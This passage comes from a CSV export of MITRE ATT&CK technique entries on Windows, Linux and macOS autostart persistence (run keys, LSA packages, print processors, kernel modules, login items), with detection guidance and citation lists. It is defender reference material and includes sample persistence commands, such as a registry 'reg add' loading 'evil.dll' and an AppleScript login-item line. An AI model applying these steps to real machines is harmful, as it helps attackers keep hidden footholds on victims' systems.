Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>""Authentication Packages""=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",https://attack.mitre.org/techniques/T1547/002,24 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation",Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA),Windows,"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1547,,,Administrator,,,,,"(Citation: Crysys Skywiper),(Citation: Microsoft Configure LSA),(Citation: Graeber 2014)"
T1547.006,attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6,Boot or Logon Autostart Execution: Kernel Modules and Extensions,"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 

When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)

Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)

Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)

Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",https://attack.mitre.org/techniques/T1547/006,24 January 2020,20 April 2022,enterprise-attack,1.3,"Persistence, Privilege Escalation","Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (""kernel object"") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)

Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>

On macOS, monitor for execution of <code>kextload</code> commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the <code>kext_policy</code> table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>.(Citation: User Approved Kernel Extension Pike’s)(Citation: Purves Kextpocalypse 2)(Citation: Apple Developer Configuration Profile)
","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Process: Process Creation",True,T1547,,"Anastasios Pingios; Eric Kaiser @ideologysec; Jeremy Galloway; Red Canary; Wayne Silva, F-Secure Countercept",root,,,,,"(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Trend Micro Skidmap),(Citation: NSA/FBI Drovorub August 2020),(Citation: Apple TN2459 Kernel Extensions),(Citation: Increasing Linux kernel integrity),(Citation: Wikibooks Grsecurity),(Citation: Chkrootkit Main),(Citation: MDMProfileConfigMacOS),(Citation: Kernel Self Protection Project),(Citation: SourceForge rkhunter),(Citation: LKM loading kernel restrictions),(Citation: Kernel.org Restrict Kernel Module)"
T1547.008,attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4,Boot or Logon Autostart Execution: LSASS Driver,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)

Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",https://attack.mitre.org/techniques/T1547/008,24 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation","With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)

Utilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. ",Windows,"Driver: Driver Load, File: File Creation, File: File Modification, Module: Module Load",True,T1547,,Vincent Le Toux,"Administrator, SYSTEM",,,,,"(Citation: Microsoft SIR Vol 21),(Citation: Microsoft Wingbird Nov 2017),(Citation: Symantec Pasam May 2012),(Citation: Microsoft DLL Security),(Citation: Microsoft Credential Guard April 2017),(Citation: Microsoft Enable Cred Guard April 2017),(Citation: Microsoft LSA Protection Mar 2014)"
T1547.015,attack-pattern--84601337-6a55-4ad7-9c35-79e0d1ea2ab3,Boot or Logon Autostart Execution: Login Items,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.

Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.

Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",https://attack.mitre.org/techniques/T1547/015,05 October 2021,18 October 2021,enterprise-attack,1.0,"Persistence, Privilege Escalation","All login items created via shared file lists are viewable by using the System Preferences GUI or in the <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file.(Citation: Open Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) These locations should be monitored and audited for known good applications.

Otherwise, login Items are located in <code>Contents/Library/LoginItems</code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items) Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true.(Citation: Adding Login Items)(Citation: Launch Service Keys Developer Apple)

Monitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections.",macOS,"File: File Creation, File: File Modification, Process: Process Creation",True,T1547,,,User,,,,,"(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: hexed osx.dok analysis 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),"
T1547.010,attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe,Boot or Logon Autostart Execution: Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\Windows\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. 

The Registry key contains entries for the following:

* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port

Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",https://attack.mitre.org/techniques/T1547/010,24 January 2020,20 April 2022,enterprise-attack,1.1,"Persistence, Privilege Escalation","Monitor process API calls to <code>AddMonitor</code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. 

Monitor Registry writes to <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism.(Citation: TechNet Autoruns)",Windows,"File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",True,T1547,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, SYSTEM",,,,SYSTEM,","
T1547.012,attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad,Boot or Logon Autostart Execution: Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)

Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL.

For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)

The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",https://attack.mitre.org/techniques/T1547/012,05 October 2020,04 October 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\SYSTEM\ControlSet001\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\\Driver</code> or <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\Driver</code> as they pertain to print processor installations.

Monitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.",Windows,"Driver: Driver Load, File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",True,T1547,,"Mathieu Tartare, ESET; Tahseen Bin Taj","Administrator, SYSTEM",,,,,"(Citation: ESET Gelsemium June 2021),(Citation: ESET PipeMon May 2020),(Citation: TrendMicro EarthLusca 2022),"
T1547.007,attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e,Boot or Logon Autostart Execution: Re-opened Applications,"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to ""Reopen windows when logging back in"".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.

Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",https://attack.mitre.org/techniques/T1547/007,24 January 2020,19 April 2022,enterprise-attack,1.1,"Persistence, Privilege Escalation",Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.,macOS,"Command: Command Execution, File: File Modification",True,T1547,,,User,,,,,",(Citation: Re-Open windows on Mac)"
T1547.001,attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following Registry keys can be used to set startup folder items for persistence:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/001,23 January 2020,16 October 2023,enterprise-attack,2.0,"Persistence, Privilege Escalation","Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.

Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"Command: Command Execution, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1547,,"Dray Agha, @Purp1eW0lf, Huntress Labs; Harun Küßner; Oddvar Moe, @oddvarmoe","Administrator, User",,,,,"(Citation: Unit 42 BadPatch Oct 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: Palo Alto Rover),(Citation: FireEye CARBANAK June 2017),(Citation: Symantec Backdoor.Mivast),(Citation: FinFisher Citation),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Unit 42 Inception November 2018),(Citation: Forcepoint Monsoon),(Citation: McAfee Netwire Mar 2015),(Citation: Telefonica Snip3 December 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Microsoft FinFisher March 2018),(Citation: Talos Group123),(Citation: Trend Micro Tick November 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Cylance Cleaver),(Citation: Talent-Jump Clambling February 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Carbon Black JCry May 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: Zscaler Higaisa 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: IBM IcedID November 2017),(Citation: Kaspersky Darkhotel),(Citation: Novetta Blockbuster),(Citation: Cymmetria Patchwork),(Citation: Arxiv Avaddon Feb 2021),(Citation: TrendMicro PE_URSNIF.A2),(Citation: ESET Grandoreiro April 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Trickbot Oct 2020),(Citation: Talos MuddyWater Jan 2022),(Citation: Palo Alto Reaver Nov 2017),(Citation: Trend Micro IXESHE 2012),(Citation: Check Point Warzone Feb 2020),(Citation: Microsoft SIR Vol 19),(Citation: DustySky),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: CISA AA20-301A Kimsuky),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: US-CERT TA18-074A),(Citation: ESET Dukes October 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: Github PowerShell Empire),(Citation: FireEye APT30),(Citation: Profero APT27 December 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Blasco 2013),(Citation: Securelist Kimsuky Sept 2013),(Citation: Cisco DNSMessenger March 2017),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET Turla Mosquito May 2018),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Korean FSI TA505 2020),(Citation: Baumgartner Naikon 2015),(Citation: Palo Alto DNS Requests),(Citation: Lunghi Iron Tiger Linux),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Talos Bisonal Mar 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: PaloAlto DNS Requests May 2016),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Sophos Maze VM September 2020),(Citation: FireEye APT33 Guardrail),(Citation: Cyble Sidewinder September 2020),(Citation: Dell Sakula),(Citation: GitHub QuasarRAT),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Microsoft Win Defender Truvasys Sep 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Periscope March 2018),(Citation: FireEye Metamorfo Apr 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Symantec Vasport May 2012),(Citation: SecureList Griffon May 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Fidelis INOCNATION),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye FIN10 June 2017),(Citation: Emissary Trojan Feb 2016),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA2541 February 2022),(Citation: Proofpoint TA416 November 2020),(Citation: ESET Okrum July 2019),(Citation: TrendMicro Gamaredon April 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: McAfee Gold Dragon),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Securelist Machete Aug 2014),(Citation: Bitdefender LuminousMoth July 2021),(Citation: CrowdStrike Ryuk January 2019),(Citation: Gh0stRAT ATT March 2019),(Citation: ESET LoJax Sept 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos Promethium June 2020),(Citation: FireEye FIN7 April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: Zscaler Cobian Aug 2017),(Citation: Cylance Machete Mar 2017),(Citation: Rewterz Sidewinder APT April 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: Microsoft Kasidet),(Citation: Fortinet Agent Tesla April 2018),(Citation: Accenture Hogfish April 2018),(Citation: Nccgroup Gh0st April 2018),(Citation: Symantec Darkmoon Aug 2005),(Citation: Unit 42 Nokki Oct 2018),(Citation: Talos NavRAT May 2018),(Citation: McAfee Lazarus Jul 2020),(Citation: Talos Rocke August 2018),(Citation: Cylance Dust Storm),(Citation: Anomali Pirate Panda April 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: fsecure NanHaiShu July 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Unit 42 Bisonal July 2018),(Citation: Malwarebytes Saint Bot April 2021),(Citation: FireEye APT41 March 2020),(Citation: Fortinet Remcos Feb 2017),(Citation: Mandiant FIN13 Aug 2022),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Talos MuddyWater May 2019),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ThreatStream Evasion Analysis),(Citation: Cybereason Molerats Dec 2020),(Citation: Talos PoetRAT April 2020),(Citation: ESET Zebrocy Nov 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: FireEye FIN7 Aug 2018),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Group IB APT 41 June 2021),(Citation: Symantec Briba May 2012),(Citation: Novetta Blockbuster RATs),(Citation: FireEye Hancitor),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: Unit 42 Kazuar May 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Group IB RTM August 2019),(Citation: Lotus Blossom Jun 2015),(Citation: Symantec Emotet Jul 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: Anomali Evasive Maneuvers July 2015),(Citation: Secureworks Karagany July 2019),(Citation: Symantec Elfin Mar 2019),(Citation: Unit42 BabyShark Feb 2019),(Citation: Lastline PlugX Analysis),(Citation: F-Secure CozyDuke),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: NCC Group APT15 Alive and Strong),(Citation: ESET Zebrocy May 2019),(Citation: Group IB Cobalt Aug 2017),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Prevailion EvilNum May 2020),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Gelsemium June 2021),(Citation: PowerSploit Documentation),(Citation: Zscaler Kasidet),(Citation: F-Secure BlackEnergy 2014),(Citation: ASERT InnaputRAT April 2018),(Citation: Lookout Dark Caracal Jan 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: CyberBit Early Bird Apr 2018),(Citation: Palo Alto Comnie),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Fidelis njRAT June 2013),(Citation: Trend Micro Qakbot December 2020),(Citation: ZScaler Hacking Team),(Citation: ESET Operation Groundbait),(Citation: Palo Alto OilRig May 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: IBM Grandoreiro April 2020),(Citation: Unit 42 NETWIRE April 2020),(Citation: Trend Micro Conficker),(Citation: Group IB Silence Sept 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro Taidoor),(Citation: ESET Gamaredon June 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Sednit Part 2),(Citation: Secureworks MCMD July 2019),(Citation: Cybereason Bazar July 2020),(Citation: Cofense NanoCore Mar 2018),(Citation: KISA Operation Muzabi),(Citation: CrowdStrike Putter Panda),(Citation: Mandiant UNC3313 Feb 2022),(Citation: McAfee Sharpshooter December 2018),(Citation: FireEye FIN6 April 2016),(Citation: ESET Turla Mosquito Jan 2018),(Citation: CIRCL PlugX March 2013),(Citation: BlackBerry Bahamut),(Citation: Securelist WhiteBear Aug 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Lazarus APT January 2022),(Citation: BlackBerry Amadey 2020),(Citation: ESET Sednit Part 1),(Citation: Mandiant No Easy Breach),(Citation: Trend Micro DRBControl February 2020),(Citation: CopyKittens Nov 2015),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: GitHub PowerSploit May 2012),(Citation: Medium Metamorfo Apr 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Malwarebytes Higaisa 2020),(Citation: FireEye APT39 Jan 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Talos Kimsuky Nov 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: Proofpoint TA505 October 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Novetta Winnti April 2015),(Citation: FireEye APT37 Feb 2018),(Citation: ESET EvilNum July 2020),(Citation: Group IB Ransomware September 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Trend Micro njRAT 2018),(Citation: Malwarebytes SmokeLoader 2016),(Citation: CERT-EE Gamaredon January 2021),(Citation: US-CERT Emotet Jul 2018),(Citation: Rancor Unit42 June 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Securelist Remexi Jan 2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: McAfee 